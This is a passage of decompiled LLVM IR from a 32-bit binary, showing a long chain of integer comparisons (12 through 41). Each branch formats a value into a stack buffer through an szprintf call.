  %v1_8049f5c = icmp eq i1 %v13_8049f58, false
  br i1 %v1_8049f5c, label %dec_label_pc_8049f8e, label %dec_label_pc_8049f5e

dec_label_pc_8049f5e:                             ; preds = %dec_label_pc_8049f58
  %v0_8049f5e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049f5e = zext i8 %v0_8049f5e to i32
  store i32 %v1_8049f5e, i32* @edx, align 4
  %v0_8049f68 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049f68 = zext i8 %v0_8049f68 to i32
  %v2_8049f77 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f77, i32* @ebx, align 4
  %v4_8049f89 = call i32 @szprintf(i32 %v2_8049f77, i32 ptrtoint ([11 x i8]* @global_var_805917c.42 to i32), i32 %v1_8049f68)
  br label %dec_label_pc_8049f8e

dec_label_pc_8049f8e:                             ; preds = %dec_label_pc_8049f58, %dec_label_pc_8049f5e
  %v13_8049f8e = icmp eq i32 %v2_8049ce5, 12
  %v1_8049f92 = icmp eq i1 %v13_8049f8e, false
  br i1 %v1_8049f92, label %dec_label_pc_8049fc4, label %dec_label_pc_8049f94

dec_label_pc_8049f94:                             ; preds = %dec_label_pc_8049f8e
  %v0_8049f94 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049f94 = zext i8 %v0_8049f94 to i32
  store i32 %v1_8049f94, i32* @edx, align 4
  %v0_8049f9e = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049f9e = zext i8 %v0_8049f9e to i32
  %v2_8049fad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fad, i32* @ebx, align 4
  %v4_8049fbf = call i32 @szprintf(i32 %v2_8049fad, i32 ptrtoint ([13 x i8]* @global_var_8059187.43 to i32), i32 %v1_8049f9e)
  br label %dec_label_pc_8049fc4

dec_label_pc_8049fc4:                             ; preds = %dec_label_pc_8049f8e, %dec_label_pc_8049f94
  %v13_8049fc4 = icmp eq i32 %v2_8049ce5, 13
  %v1_8049fc8 = icmp eq i1 %v13_8049fc4, false
  br i1 %v1_8049fc8, label %dec_label_pc_8049ffa, label %dec_label_pc_8049fca

dec_label_pc_8049fca:                             ; preds = %dec_label_pc_8049fc4
  %v0_8049fca = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049fca = zext i8 %v0_8049fca to i32
  store i32 %v1_8049fca, i32* @edx, align 4
  %v0_8049fd4 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049fd4 = zext i8 %v0_8049fd4 to i32
  %v2_8049fe3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fe3, i32* @ebx, align 4
  %v4_8049ff5 = call i32 @szprintf(i32 %v2_8049fe3, i32 ptrtoint ([13 x i8]* @global_var_8059194.44 to i32), i32 %v1_8049fd4)
  br label %dec_label_pc_8049ffa

dec_label_pc_8049ffa:                             ; preds = %dec_label_pc_8049fc4, %dec_label_pc_8049fca
  %v13_8049ffa = icmp eq i32 %v2_8049ce5, 14
  %v1_8049ffe = icmp eq i1 %v13_8049ffa, false
  br i1 %v1_8049ffe, label %dec_label_pc_804a030, label %dec_label_pc_804a000

dec_label_pc_804a000:                             ; preds = %dec_label_pc_8049ffa
  %v0_804a000 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a000 = zext i8 %v0_804a000 to i32
  store i32 %v1_804a000, i32* @edx, align 4
  %v0_804a00a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a00a = zext i8 %v0_804a00a to i32
  %v2_804a019 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a019, i32* @ebx, align 4
  %v4_804a02b = call i32 @szprintf(i32 %v2_804a019, i32 ptrtoint ([13 x i8]* @global_var_80591a1.45 to i32), i32 %v1_804a00a)
  br label %dec_label_pc_804a030

dec_label_pc_804a030:                             ; preds = %dec_label_pc_8049ffa, %dec_label_pc_804a000
  %v13_804a030 = icmp eq i32 %v2_8049ce5, 15
  %v1_804a034 = icmp eq i1 %v13_804a030, false
  br i1 %v1_804a034, label %dec_label_pc_804a066, label %dec_label_pc_804a036

dec_label_pc_804a036:                             ; preds = %dec_label_pc_804a030
  %v0_804a036 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a036 = zext i8 %v0_804a036 to i32
  store i32 %v1_804a036, i32* @edx, align 4
  %v0_804a040 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a040 = zext i8 %v0_804a040 to i32
  %v2_804a04f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a04f, i32* @ebx, align 4
  %v4_804a061 = call i32 @szprintf(i32 %v2_804a04f, i32 ptrtoint ([13 x i8]* @global_var_80591ae.46 to i32), i32 %v1_804a040)
  br label %dec_label_pc_804a066

dec_label_pc_804a066:                             ; preds = %dec_label_pc_804a030, %dec_label_pc_804a036
  %v10_804a066 = icmp eq i32 %v2_8049ce5, 16
  %v1_804a06a = icmp eq i1 %v10_804a066, false
  br i1 %v1_804a06a, label %dec_label_pc_804a09c, label %dec_label_pc_804a06c

dec_label_pc_804a06c:                             ; preds = %dec_label_pc_804a066
  %v0_804a06c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a06c = zext i8 %v0_804a06c to i32
  store i32 %v1_804a06c, i32* @edx, align 4
  %v0_804a076 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a076 = zext i8 %v0_804a076 to i32
  %v2_804a085 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a085, i32* @ebx, align 4
  %v4_804a097 = call i32 @szprintf(i32 %v2_804a085, i32 ptrtoint ([13 x i8]* @global_var_80591bb.47 to i32), i32 %v1_804a076)
  br label %dec_label_pc_804a09c

dec_label_pc_804a09c:                             ; preds = %dec_label_pc_804a066, %dec_label_pc_804a06c
  %v13_804a09c = icmp eq i32 %v2_8049ce5, 17
  %v1_804a0a0 = icmp eq i1 %v13_804a09c, false
  br i1 %v1_804a0a0, label %dec_label_pc_804a0d2, label %dec_label_pc_804a0a2

dec_label_pc_804a0a2:                             ; preds = %dec_label_pc_804a09c
  %v0_804a0a2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a0a2 = zext i8 %v0_804a0a2 to i32
  store i32 %v1_804a0a2, i32* @edx, align 4
  %v0_804a0ac = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a0ac = zext i8 %v0_804a0ac to i32
  %v2_804a0bb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0bb, i32* @ebx, align 4
  %v4_804a0cd = call i32 @szprintf(i32 %v2_804a0bb, i32 ptrtoint ([13 x i8]* @global_var_80591c8.48 to i32), i32 %v1_804a0ac)
  br label %dec_label_pc_804a0d2

dec_label_pc_804a0d2:                             ; preds = %dec_label_pc_804a09c, %dec_label_pc_804a0a2
  %v13_804a0d2 = icmp eq i32 %v2_8049ce5, 18
  %v1_804a0d6 = icmp eq i1 %v13_804a0d2, false
  br i1 %v1_804a0d6, label %dec_label_pc_804a108, label %dec_label_pc_804a0d8

dec_label_pc_804a0d8:                             ; preds = %dec_label_pc_804a0d2
  %v0_804a0d8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a0d8 = zext i8 %v0_804a0d8 to i32
  store i32 %v1_804a0d8, i32* @edx, align 4
  %v0_804a0e2 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a0e2 = zext i8 %v0_804a0e2 to i32
  %v2_804a0f1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0f1, i32* @ebx, align 4
  %v4_804a103 = call i32 @szprintf(i32 %v2_804a0f1, i32 ptrtoint ([13 x i8]* @global_var_80591d5.49 to i32), i32 %v1_804a0e2)
  br label %dec_label_pc_804a108

dec_label_pc_804a108:                             ; preds = %dec_label_pc_804a0d2, %dec_label_pc_804a0d8
  %v13_804a108 = icmp eq i32 %v2_8049ce5, 19
  %v1_804a10c = icmp eq i1 %v13_804a108, false
  br i1 %v1_804a10c, label %dec_label_pc_804a13e, label %dec_label_pc_804a10e

dec_label_pc_804a10e:                             ; preds = %dec_label_pc_804a108
  %v0_804a10e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a10e = zext i8 %v0_804a10e to i32
  store i32 %v1_804a10e, i32* @edx, align 4
  %v0_804a118 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a118 = zext i8 %v0_804a118 to i32
  %v2_804a127 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a127, i32* @ebx, align 4
  %v4_804a139 = call i32 @szprintf(i32 %v2_804a127, i32 ptrtoint ([11 x i8]* @global_var_80591e2.50 to i32), i32 %v1_804a118)
  br label %dec_label_pc_804a13e

dec_label_pc_804a13e:                             ; preds = %dec_label_pc_804a108, %dec_label_pc_804a10e
  %v13_804a13e = icmp eq i32 %v2_8049ce5, 20
  %v1_804a142 = icmp eq i1 %v13_804a13e, false
  br i1 %v1_804a142, label %dec_label_pc_804a174, label %dec_label_pc_804a144

dec_label_pc_804a144:                             ; preds = %dec_label_pc_804a13e
  %v0_804a144 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a144 = zext i8 %v0_804a144 to i32
  store i32 %v1_804a144, i32* @edx, align 4
  %v0_804a14e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a14e = zext i8 %v0_804a14e to i32
  %v2_804a15d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a15d, i32* @ebx, align 4
  %v4_804a16f = call i32 @szprintf(i32 %v2_804a15d, i32 ptrtoint ([12 x i8]* @global_var_80591ed.51 to i32), i32 %v1_804a14e)
  br label %dec_label_pc_804a174

dec_label_pc_804a174:                             ; preds = %dec_label_pc_804a13e, %dec_label_pc_804a144
  %v13_804a174 = icmp eq i32 %v2_8049ce5, 21
  %v1_804a178 = icmp eq i1 %v13_804a174, false
  br i1 %v1_804a178, label %dec_label_pc_804a1aa, label %dec_label_pc_804a17a

dec_label_pc_804a17a:                             ; preds = %dec_label_pc_804a174
  %v0_804a17a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a17a = zext i8 %v0_804a17a to i32
  store i32 %v1_804a17a, i32* @edx, align 4
  %v0_804a184 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a184 = zext i8 %v0_804a184 to i32
  %v2_804a193 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a193, i32* @ebx, align 4
  %v4_804a1a5 = call i32 @szprintf(i32 %v2_804a193, i32 ptrtoint ([13 x i8]* @global_var_80591f9.52 to i32), i32 %v1_804a184)
  br label %dec_label_pc_804a1aa

dec_label_pc_804a1aa:                             ; preds = %dec_label_pc_804a174, %dec_label_pc_804a17a
  %v13_804a1aa = icmp eq i32 %v2_8049ce5, 22
  %v1_804a1ae = icmp eq i1 %v13_804a1aa, false
  br i1 %v1_804a1ae, label %dec_label_pc_804a1e0, label %dec_label_pc_804a1b0

dec_label_pc_804a1b0:                             ; preds = %dec_label_pc_804a1aa
  %v0_804a1b0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a1b0 = zext i8 %v0_804a1b0 to i32
  store i32 %v1_804a1b0, i32* @edx, align 4
  %v0_804a1ba = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a1ba = zext i8 %v0_804a1ba to i32
  %v2_804a1c9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1c9, i32* @ebx, align 4
  %v4_804a1db = call i32 @szprintf(i32 %v2_804a1c9, i32 ptrtoint ([11 x i8]* @global_var_8059206.53 to i32), i32 %v1_804a1ba)
  br label %dec_label_pc_804a1e0

dec_label_pc_804a1e0:                             ; preds = %dec_label_pc_804a1aa, %dec_label_pc_804a1b0
  %v13_804a1e0 = icmp eq i32 %v2_8049ce5, 23
  %v1_804a1e4 = icmp eq i1 %v13_804a1e0, false
  br i1 %v1_804a1e4, label %dec_label_pc_804a216, label %dec_label_pc_804a1e6

dec_label_pc_804a1e6:                             ; preds = %dec_label_pc_804a1e0
  %v0_804a1e6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a1e6 = zext i8 %v0_804a1e6 to i32
  store i32 %v1_804a1e6, i32* @edx, align 4
  %v0_804a1f0 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a1f0 = zext i8 %v0_804a1f0 to i32
  %v2_804a1ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1ff, i32* @ebx, align 4
  %v4_804a211 = call i32 @szprintf(i32 %v2_804a1ff, i32 ptrtoint ([11 x i8]* @global_var_8059211.54 to i32), i32 %v1_804a1f0)
  br label %dec_label_pc_804a216

dec_label_pc_804a216:                             ; preds = %dec_label_pc_804a1e0, %dec_label_pc_804a1e6
  %v13_804a216 = icmp eq i32 %v2_8049ce5, 24
  %v1_804a21a = icmp eq i1 %v13_804a216, false
  br i1 %v1_804a21a, label %dec_label_pc_804a24c, label %dec_label_pc_804a21c

dec_label_pc_804a21c:                             ; preds = %dec_label_pc_804a216
  %v0_804a21c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a21c = zext i8 %v0_804a21c to i32
  store i32 %v1_804a21c, i32* @edx, align 4
  %v0_804a226 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a226 = zext i8 %v0_804a226 to i32
  %v2_804a235 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a235, i32* @ebx, align 4
  %v4_804a247 = call i32 @szprintf(i32 %v2_804a235, i32 ptrtoint ([12 x i8]* @global_var_805921c.55 to i32), i32 %v1_804a226)
  br label %dec_label_pc_804a24c

dec_label_pc_804a24c:                             ; preds = %dec_label_pc_804a216, %dec_label_pc_804a21c
  %v13_804a24c = icmp eq i32 %v2_8049ce5, 25
  %v1_804a250 = icmp eq i1 %v13_804a24c, false
  br i1 %v1_804a250, label %dec_label_pc_804a282, label %dec_label_pc_804a252

dec_label_pc_804a252:                             ; preds = %dec_label_pc_804a24c
  %v0_804a252 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a252 = zext i8 %v0_804a252 to i32
  store i32 %v1_804a252, i32* @edx, align 4
  %v0_804a25c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a25c = zext i8 %v0_804a25c to i32
  %v2_804a26b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a26b, i32* @ebx, align 4
  %v4_804a27d = call i32 @szprintf(i32 %v2_804a26b, i32 ptrtoint ([12 x i8]* @global_var_8059228.56 to i32), i32 %v1_804a25c)
  br label %dec_label_pc_804a282

dec_label_pc_804a282:                             ; preds = %dec_label_pc_804a24c, %dec_label_pc_804a252
  %v13_804a282 = icmp eq i32 %v2_8049ce5, 26
  %v1_804a286 = icmp eq i1 %v13_804a282, false
  br i1 %v1_804a286, label %dec_label_pc_804a2b8, label %dec_label_pc_804a288

dec_label_pc_804a288:                             ; preds = %dec_label_pc_804a282
  %v0_804a288 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a288 = zext i8 %v0_804a288 to i32
  store i32 %v1_804a288, i32* @edx, align 4
  %v0_804a292 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a292 = zext i8 %v0_804a292 to i32
  %v2_804a2a1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2a1, i32* @ebx, align 4
  %v4_804a2b3 = call i32 @szprintf(i32 %v2_804a2a1, i32 ptrtoint ([12 x i8]* @global_var_8059234.57 to i32), i32 %v1_804a292)
  br label %dec_label_pc_804a2b8

dec_label_pc_804a2b8:                             ; preds = %dec_label_pc_804a282, %dec_label_pc_804a288
  %v13_804a2b8 = icmp eq i32 %v2_8049ce5, 27
  %v1_804a2bc = icmp eq i1 %v13_804a2b8, false
  br i1 %v1_804a2bc, label %dec_label_pc_804a2ee, label %dec_label_pc_804a2be

dec_label_pc_804a2be:                             ; preds = %dec_label_pc_804a2b8
  %v0_804a2be = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a2be = zext i8 %v0_804a2be to i32
  store i32 %v1_804a2be, i32* @edx, align 4
  %v0_804a2c8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a2c8 = zext i8 %v0_804a2c8 to i32
  %v2_804a2d7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2d7, i32* @ebx, align 4
  %v4_804a2e9 = call i32 @szprintf(i32 %v2_804a2d7, i32 ptrtoint ([13 x i8]* @global_var_8059240.58 to i32), i32 %v1_804a2c8)
  br label %dec_label_pc_804a2ee

dec_label_pc_804a2ee:                             ; preds = %dec_label_pc_804a2b8, %dec_label_pc_804a2be
  %v13_804a2ee = icmp eq i32 %v2_8049ce5, 28
  %v1_804a2f2 = icmp eq i1 %v13_804a2ee, false
  br i1 %v1_804a2f2, label %dec_label_pc_804a324, label %dec_label_pc_804a2f4

dec_label_pc_804a2f4:                             ; preds = %dec_label_pc_804a2ee
  %v0_804a2f4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a2f4 = zext i8 %v0_804a2f4 to i32
  store i32 %v1_804a2f4, i32* @edx, align 4
  %v0_804a2fe = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a2fe = zext i8 %v0_804a2fe to i32
  %v2_804a30d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a30d, i32* @ebx, align 4
  %v4_804a31f = call i32 @szprintf(i32 %v2_804a30d, i32 ptrtoint ([13 x i8]* @global_var_805924d.59 to i32), i32 %v1_804a2fe)
  br label %dec_label_pc_804a324

dec_label_pc_804a324:                             ; preds = %dec_label_pc_804a2ee, %dec_label_pc_804a2f4
  %v13_804a324 = icmp eq i32 %v2_8049ce5, 29
  %v1_804a328 = icmp eq i1 %v13_804a324, false
  br i1 %v1_804a328, label %dec_label_pc_804a35a, label %dec_label_pc_804a32a

dec_label_pc_804a32a:                             ; preds = %dec_label_pc_804a324
  %v0_804a32a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a32a = zext i8 %v0_804a32a to i32
  store i32 %v1_804a32a, i32* @edx, align 4
  %v0_804a334 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a334 = zext i8 %v0_804a334 to i32
  %v2_804a343 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a343, i32* @ebx, align 4
  %v4_804a355 = call i32 @szprintf(i32 %v2_804a343, i32 ptrtoint ([12 x i8]* @global_var_805925a.60 to i32), i32 %v1_804a334)
  br label %dec_label_pc_804a35a

dec_label_pc_804a35a:                             ; preds = %dec_label_pc_804a324, %dec_label_pc_804a32a
  %v13_804a35a = icmp eq i32 %v2_8049ce5, 30
  %v1_804a35e = icmp eq i1 %v13_804a35a, false
  br i1 %v1_804a35e, label %dec_label_pc_804a390, label %dec_label_pc_804a360

dec_label_pc_804a360:                             ; preds = %dec_label_pc_804a35a
  %v0_804a360 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a360 = zext i8 %v0_804a360 to i32
  store i32 %v1_804a360, i32* @edx, align 4
  %v0_804a36a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a36a = zext i8 %v0_804a36a to i32
  %v2_804a379 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a379, i32* @ebx, align 4
  %v4_804a38b = call i32 @szprintf(i32 %v2_804a379, i32 ptrtoint ([13 x i8]* @global_var_8059266.61 to i32), i32 %v1_804a36a)
  br label %dec_label_pc_804a390

dec_label_pc_804a390:                             ; preds = %dec_label_pc_804a35a, %dec_label_pc_804a360
  %v13_804a390 = icmp eq i32 %v2_8049ce5, 31
  %v1_804a394 = icmp eq i1 %v13_804a390, false
  br i1 %v1_804a394, label %dec_label_pc_804a3c6, label %dec_label_pc_804a396

dec_label_pc_804a396:                             ; preds = %dec_label_pc_804a390
  %v0_804a396 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a396 = zext i8 %v0_804a396 to i32
  store i32 %v1_804a396, i32* @edx, align 4
  %v0_804a3a0 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a3a0 = zext i8 %v0_804a3a0 to i32
  %v2_804a3af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3af, i32* @ebx, align 4
  %v4_804a3c1 = call i32 @szprintf(i32 %v2_804a3af, i32 ptrtoint ([12 x i8]* @global_var_8059273.62 to i32), i32 %v1_804a3a0)
  br label %dec_label_pc_804a3c6

dec_label_pc_804a3c6:                             ; preds = %dec_label_pc_804a390, %dec_label_pc_804a396
  %v10_804a3c6 = icmp eq i32 %v2_8049ce5, 32
  %v1_804a3ca = icmp eq i1 %v10_804a3c6, false
  br i1 %v1_804a3ca, label %dec_label_pc_804a3fc, label %dec_label_pc_804a3cc

dec_label_pc_804a3cc:                             ; preds = %dec_label_pc_804a3c6
  %v0_804a3cc = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a3cc = zext i8 %v0_804a3cc to i32
  store i32 %v1_804a3cc, i32* @edx, align 4
  %v0_804a3d6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a3d6 = zext i8 %v0_804a3d6 to i32
  %v2_804a3e5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3e5, i32* @ebx, align 4
  %v4_804a3f7 = call i32 @szprintf(i32 %v2_804a3e5, i32 ptrtoint ([11 x i8]* @global_var_805927f.63 to i32), i32 %v1_804a3d6)
  br label %dec_label_pc_804a3fc

dec_label_pc_804a3fc:                             ; preds = %dec_label_pc_804a3c6, %dec_label_pc_804a3cc
  %v13_804a3fc = icmp eq i32 %v2_8049ce5, 33
  %v1_804a400 = icmp eq i1 %v13_804a3fc, false
  br i1 %v1_804a400, label %dec_label_pc_804a432, label %dec_label_pc_804a402

dec_label_pc_804a402:                             ; preds = %dec_label_pc_804a3fc
  %v0_804a402 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a402 = zext i8 %v0_804a402 to i32
  store i32 %v1_804a402, i32* @edx, align 4
  %v0_804a40c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a40c = zext i8 %v0_804a40c to i32
  %v2_804a41b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a41b, i32* @ebx, align 4
  %v4_804a42d = call i32 @szprintf(i32 %v2_804a41b, i32 ptrtoint ([12 x i8]* @global_var_805928a.64 to i32), i32 %v1_804a40c)
  br label %dec_label_pc_804a432

dec_label_pc_804a432:                             ; preds = %dec_label_pc_804a3fc, %dec_label_pc_804a402
  %v13_804a432 = icmp eq i32 %v2_8049ce5, 34
  %v1_804a436 = icmp eq i1 %v13_804a432, false
  br i1 %v1_804a436, label %dec_label_pc_804a468, label %dec_label_pc_804a438

dec_label_pc_804a438:                             ; preds = %dec_label_pc_804a432
  %v0_804a438 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a438 = zext i8 %v0_804a438 to i32
  store i32 %v1_804a438, i32* @edx, align 4
  %v0_804a442 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a442 = zext i8 %v0_804a442 to i32
  %v2_804a451 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a451, i32* @ebx, align 4
  %v4_804a463 = call i32 @szprintf(i32 %v2_804a451, i32 ptrtoint ([12 x i8]* @global_var_8059296.65 to i32), i32 %v1_804a442)
  br label %dec_label_pc_804a468

dec_label_pc_804a468:                             ; preds = %dec_label_pc_804a432, %dec_label_pc_804a438
  %v13_804a468 = icmp eq i32 %v2_8049ce5, 35
  %v1_804a46c = icmp eq i1 %v13_804a468, false
  br i1 %v1_804a46c, label %dec_label_pc_804a49e, label %dec_label_pc_804a46e

dec_label_pc_804a46e:                             ; preds = %dec_label_pc_804a468
  %v0_804a46e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a46e = zext i8 %v0_804a46e to i32
  store i32 %v1_804a46e, i32* @edx, align 4
  %v0_804a478 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a478 = zext i8 %v0_804a478 to i32
  %v2_804a487 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a487, i32* @ebx, align 4
  %v4_804a499 = call i32 @szprintf(i32 %v2_804a487, i32 ptrtoint ([12 x i8]* @global_var_80592a2.66 to i32), i32 %v1_804a478)
  br label %dec_label_pc_804a49e

dec_label_pc_804a49e:                             ; preds = %dec_label_pc_804a468, %dec_label_pc_804a46e
  %v13_804a49e = icmp eq i32 %v2_8049ce5, 36
  %v1_804a4a2 = icmp eq i1 %v13_804a49e, false
  br i1 %v1_804a4a2, label %dec_label_pc_804a4d4, label %dec_label_pc_804a4a4

dec_label_pc_804a4a4:                             ; preds = %dec_label_pc_804a49e
  %v0_804a4a4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a4a4 = zext i8 %v0_804a4a4 to i32
  store i32 %v1_804a4a4, i32* @edx, align 4
  %v0_804a4ae = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a4ae = zext i8 %v0_804a4ae to i32
  %v2_804a4bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4bd, i32* @ebx, align 4
  %v4_804a4cf = call i32 @szprintf(i32 %v2_804a4bd, i32 ptrtoint ([12 x i8]* @global_var_80592ae.67 to i32), i32 %v1_804a4ae)
  br label %dec_label_pc_804a4d4

dec_label_pc_804a4d4:                             ; preds = %dec_label_pc_804a49e, %dec_label_pc_804a4a4
  %v13_804a4d4 = icmp eq i32 %v2_8049ce5, 37
  %v1_804a4d8 = icmp eq i1 %v13_804a4d4, false
  br i1 %v1_804a4d8, label %dec_label_pc_804a50a, label %dec_label_pc_804a4da

dec_label_pc_804a4da:                             ; preds = %dec_label_pc_804a4d4
  %v0_804a4da = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a4da = zext i8 %v0_804a4da to i32
  store i32 %v1_804a4da, i32* @edx, align 4
  %v0_804a4e4 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a4e4 = zext i8 %v0_804a4e4 to i32
  %v2_804a4f3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4f3, i32* @ebx, align 4
  %v4_804a505 = call i32 @szprintf(i32 %v2_804a4f3, i32 ptrtoint ([12 x i8]* @global_var_80592ba.68 to i32), i32 %v1_804a4e4)
  br label %dec_label_pc_804a50a

dec_label_pc_804a50a:                             ; preds = %dec_label_pc_804a4d4, %dec_label_pc_804a4da
  %v13_804a50a = icmp eq i32 %v2_8049ce5, 38
  %v1_804a50e = icmp eq i1 %v13_804a50a, false
  br i1 %v1_804a50e, label %dec_label_pc_804a540, label %dec_label_pc_804a510

dec_label_pc_804a510:                             ; preds = %dec_label_pc_804a50a
  %v0_804a510 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a510 = zext i8 %v0_804a510 to i32
  store i32 %v1_804a510, i32* @edx, align 4
  %v0_804a51a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a51a = zext i8 %v0_804a51a to i32
  %v2_804a529 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a529, i32* @ebx, align 4
  %v4_804a53b = call i32 @szprintf(i32 %v2_804a529, i32 ptrtoint ([13 x i8]* @global_var_80592c6.69 to i32), i32 %v1_804a51a)
  br label %dec_label_pc_804a540

dec_label_pc_804a540:                             ; preds = %dec_label_pc_804a50a, %dec_label_pc_804a510
  %v13_804a540 = icmp eq i32 %v2_8049ce5, 39
  %v1_804a544 = icmp eq i1 %v13_804a540, false
  br i1 %v1_804a544, label %dec_label_pc_804a576, label %dec_label_pc_804a546

dec_label_pc_804a546:                             ; preds = %dec_label_pc_804a540
  %v0_804a546 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a546 = zext i8 %v0_804a546 to i32
  store i32 %v1_804a546, i32* @edx, align 4
  %v0_804a550 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a550 = zext i8 %v0_804a550 to i32
  %v2_804a55f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a55f, i32* @ebx, align 4
  %v4_804a571 = call i32 @szprintf(i32 %v2_804a55f, i32 ptrtoint ([13 x i8]* @global_var_80592d3.70 to i32), i32 %v1_804a550)
  br label %dec_label_pc_804a576

dec_label_pc_804a576:                             ; preds = %dec_label_pc_804a540, %dec_label_pc_804a546
  %v13_804a576 = icmp eq i32 %v2_8049ce5, 40
  %v1_804a57a = icmp eq i1 %v13_804a576, false
  br i1 %v1_804a57a, label %dec_label_pc_804a5ac, label %dec_label_pc_804a57c

dec_label_pc_804a57c:                             ; preds = %dec_label_pc_804a576
  %v0_804a57c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a57c = zext i8 %v0_804a57c to i32
  store i32 %v1_804a57c, i32* @edx, align 4
  %v0_804a586 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a586 = zext i8 %v0_804a586 to i32
  %v2_804a595 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a595, i32* @ebx, align 4
  %v4_804a5a7 = call i32 @szprintf(i32 %v2_804a595, i32 ptrtoint ([13 x i8]* @global_var_80592c6.69 to i32), i32 %v1_804a586)
  br label %dec_label_pc_804a5ac

dec_label_pc_804a5ac:                             ; preds = %dec_label_pc_804a576, %dec_label_pc_804a57c
  %v13_804a5ac = icmp eq i32 %v2_8049ce5, 41
  %v1_804a5b0 = icmp eq i1 %v13_804a5ac, false
  br i1 %v1_804a5b0, label %dec_label_pc_804a5e2, label %dec_label_pc_804a5b2

dec_label_pc_804a5b2:                             ; preds = %dec_label_pc_804a5ac
  %v0_804a5b2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a5b2 = zext i8 %v0_804a5b2 to i32
  store i32 %v1_804a5b2, i32* @edx, align 4
  %v0_804a5bc = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a5bc = zext i8 %v0_804a5bc to i32
  %v2_804a5cb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5cb, i32* @ebx, align 4
